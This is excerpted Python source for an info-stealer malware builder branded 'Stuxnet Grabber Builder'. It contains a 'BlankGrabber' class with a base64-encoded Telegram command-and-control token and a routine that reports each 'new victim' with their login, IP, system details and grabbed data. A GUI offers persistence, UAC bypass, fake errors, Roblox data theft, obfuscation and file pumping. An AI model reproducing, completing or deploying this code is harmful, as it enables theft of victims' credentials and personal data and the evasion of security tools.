...
class Settings:
    C2 = (1, base64.b64decode('NjY5Njg5MDcxMzpBQUVBVmhDekpsenlUTnktTFhqSUNXem5CUnYyeTRENmlXSSQ2MDQ3MTI0NTUz').decode())
    Mutex = base64.b64decode('ajNySGs5UzBZNGU0OTQ5OQ==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('true')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('U3R1eG5ldA==').decode()
...
class BlankGrabber:
    ...
    def SendData(self) -> None:
        ...
        match Settings.C2[0]:
            ...
            case 1:
                payload = {'caption': f'<b>Stuxnet Backdoor, File Password: Stuxnet</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("Stuxnet Grabber Builder")
        ...
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Stuxnet-ava.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Stuxnet-ava.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Stuxnet-ava.png")), size=(20, 20))
        ...
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}Stuxnet-ava.ico")

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Stuxnet Grabber Builder", image=self.logo_image,
        ...
        self.dashboard_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Builder",
                                                        ...
                                                        text_color=("gray70", "gray30"), hover_color=("gray70", "gray30"),
        ...
        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=customtkinter.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray70", "gray30"), hover_color=("gray70", "gray30"), image=self.docs_image, anchor="w", command=self.docs_button_event)
        ...
        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#104E8B", hover_color="#5057eb", font=customtkinter.CTkFont(size=15, family=self.font))
        ...
        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#104E8B", hover_color="#5057eb")
        ...
        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#104E8B", hover_color="#5057eb")
        ...
        self.pingtype = customtkinter.CTkOptionMenu(
            ...
            fg_color="#104E8B", button_hover_color="#5057eb", button_color="#480c96")
        ...
        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#104E8B", hover_color="#5057eb")
        ...
        self.startup = customtkinter.CTkCheckBox(
            ...
            fg_color="#104E8B", hover_color="#5057eb")
        ...
        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#104E8B", hover_color="#5057eb", command=self.check_roblox)
        ...
        self.obfuscation = customtkinter.CTkCheckBox(
            ...
            fg_color="#104E8B", hover_color="#5057eb", command=self.check_cxfreeze)
        ...
        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#104E8B", hover_color="#5057eb", command=self.check_pumper)
        ...
        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#104E8B", button_hover_color="#5057eb", button_color="#480c96")
        ...
        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
                                                    ...
                                                    fg_color="#104E8B", button_hover_color="#5057eb", button_color="#480c96", command=self.multi_commands)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#104E8B", hover_color="#5057eb",
        ...
        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#104E8B", hover_color="#5057eb", command=self.buildfile)
    ...
    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#104E8B", hover_color="#5057eb",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
    ...
    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#104E8B", hover_color="#5057eb", text="Check Webhook")
    ...
    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#104E8B", hover_color="#5057eb")
                time.sleep(0.3)
                self.update()
    ...
    def get_config(self):
        try:
            with open(self.basefilepath + "\\Stuxnet.py", 'r', encoding="utf-8") as f:
                code = f.read()
            ...
            if config_match:
                ...
                raise Exception("Could not find config in Stuxnet.py")
